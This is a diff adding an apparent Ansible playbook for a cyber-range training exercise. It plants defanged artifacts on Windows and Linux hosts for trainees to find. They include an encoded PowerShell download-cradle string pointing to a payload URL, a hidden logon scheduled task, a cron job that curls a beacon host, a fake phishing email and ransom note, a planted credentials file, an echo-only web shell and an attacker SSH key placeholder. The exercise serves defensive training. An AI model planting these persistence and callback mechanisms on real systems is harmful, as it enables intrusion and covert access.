@@ -1,0 +1,155 @@
+---
+# ============================================================
+# TrueNorth Range — Inject Pre-Staged Scenario Artifacts
+# ============================================================
+# Drops defanged malware, phishing emails, breadcrumbs, and
+# suspicious artefacts that trainees must discover during exercises.
+#
+# Usage:
+#   ansible-playbook playbooks/inject-scenario.yml \
+#     -e scenario=apt-breach -e exercise_id=ex-001
+
+- name: "Inject — Windows Targets (malware, scheduled tasks, phishing)"
+  hosts: workstations:domain_controllers
+  gather_facts: true
+  vars:
+    inject_base: 'C:\TrueNorth\Injects'
+    scenario: "{{ scenario | default('default') }}"
+  tasks:
+    - name: Create inject staging directory
+      ansible.windows.win_file:
+        path: "{{ inject_base }}\\{{ scenario }}"
+        state: directory
+      tags: [inject, setup]
+
+    - name: Drop defanged malware samples
+      ansible.windows.win_copy:
+        content: |
+          REM ========================================
+          REM DEFANGED SAMPLE — NOT REAL MALWARE
+          REM Exercise: {{ exercise_id }}
+          REM Scenario: {{ scenario }}
+          REM ========================================
+          @echo off
+          echo [SIMULATED] Beacon callback to C2 at 198.51.100.42:443
+          echo [SIMULATED] Downloading payload stage2.exe
+          echo [SIMULATED] Establishing persistence via registry run key
+          timeout /t 5 >nul
+        dest: '{{ inject_base }}\{{ scenario }}\update_service.bat'
+      tags: [inject, malware]
+
+    - name: Drop suspicious PowerShell script
+      ansible.windows.win_copy:
+        content: |
+          # DEFANGED — Exercise artifact for {{ exercise_id }}
+          # Simulates encoded PowerShell download cradle
+          $encoded = "SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTk4LjUxLjEwMC40Mi9wYXlsb2FkLmV4ZQ=="
+          # In a real attack this would decode and execute
+          Write-Host "[SIMULATED] Encoded payload would execute here"
+          # Breadcrumb: check Event ID 4104 for this script block
+        dest: '{{ inject_base }}\{{ scenario }}\update_check.ps1'
+      tags: [inject, malware]
+
+    - name: Create suspicious scheduled task
+      ansible.windows.win_shell: |
+        $taskName = "WindowsUpdateCheck_{{ scenario }}"
+        $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+        if (-not $existing) {
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
+                -Argument "-WindowStyle Hidden -File {{ inject_base }}\{{ scenario }}\update_check.ps1"
+            $trigger = New-ScheduledTaskTrigger -AtLogon
+            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
+                -Description "DEFANGED exercise artifact" -RunLevel Highest
+        }
+      tags: [inject, persistence]
+
+    - name: Plant phishing email evidence (EML file)
+      ansible.windows.win_copy:
+        content: |
+          From: hr-noreply@{{ range_domain }}
+          To: {{ ad_sample_users[0].username }}@{{ range_domain }}
+          Subject: Urgent: Verify Your Credentials
+          Date: {{ ansible_date_time.iso8601 | default('2025-01-15T09:30:00Z') }}
+          MIME-Version: 1.0
+          Content-Type: text/html; charset=UTF-8
+          X-TrueNorth-Exercise: {{ exercise_id }}
+          X-Defanged: true
+
+          <html><body>
+          <p>Dear Employee,</p>
+          <p>Your account credentials need immediate verification.
+          Click <a href="http://198.51.100.42/portal/login.php">here</a> to verify.</p>
+          <p>— HR Department</p>
+          </body></html>
+        dest: '{{ inject_base }}\{{ scenario }}\phishing_email.eml'
+      tags: [inject, phishing]
+
+    - name: Create exercise breadcrumbs
+      ansible.windows.win_copy:
+        content: |
+          {{ item.content }}
+        dest: '{{ item.path }}'
+      loop:
+        - path: 'C:\Users\Public\Documents\credentials.txt'
+          content: |
+            # BREADCRUMB — {{ exercise_id }}
+            # Trainees should flag this as suspicious
+            admin:P@ssw0rd123!
+            svc_backup:Backup2025!
+        - path: 'C:\Users\Public\Desktop\README_IMPORTANT.txt'
+          content: |
+            YOUR FILES HAVE BEEN ENCRYPTED
+            Contact: ransom@198.51.100.42
+            Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+            --- DEFANGED EXERCISE ARTIFACT ({{ exercise_id }}) ---
+      loop_control:
+        label: "{{ item.path }}"
+      tags: [inject, breadcrumbs]
+
+- name: "Inject — Linux Targets (web shells, suspicious files)"
+  hosts: servers
+  become: true
+  gather_facts: true
+  vars:
+    scenario: "{{ scenario | default('default') }}"
+  tasks:
+    - name: Create inject directory
+      ansible.builtin.file:
+        path: "/opt/truenorth/injects/{{ scenario }}"
+        state: directory
+        mode: "0750"
+      tags: [inject, setup]
+
+    - name: Drop defanged web shell
+      ansible.builtin.copy:
+        content: |
+          <?php
+          // DEFANGED — TrueNorth Exercise {{ exercise_id }}
+          // Simulated web shell — does NOT execute commands
+          // Trainees should detect this via file integrity monitoring
+          echo "<!-- TrueNorth exercise artifact -->";
+          if (isset($_GET['cmd'])) {
+              echo "[SIMULATED] Would execute: " . htmlspecialchars($_GET['cmd']);
+          }
+          ?>
+        dest: /var/www/dvwa/shell.php
+        mode: "0644"
+      tags: [inject, webshell]
+
+    - name: Create suspicious cron job
+      ansible.builtin.cron:
+        name: "truenorth_inject_{{ scenario }}"
+        minute: "*/15"
+        job: "curl -s http://198.51.100.42/beacon 2>/dev/null || true  # DEFANGED exercise artifact"
+        user: www-data
+      tags: [inject, persistence]
+
+    - name: Drop suspicious SSH key (breadcrumb)
+      ansible.builtin.copy:
+        content: |
+          # DEFANGED — Exercise breadcrumb
+          # Trainees should detect unauthorized SSH key
+          ssh-rsa AAAAB3...PLACEHOLDER...== attacker@evil.example.com
+        dest: /root/.ssh/authorized_keys.bak
+        mode: "0600"
+      tags: [inject, breadcrumbs]
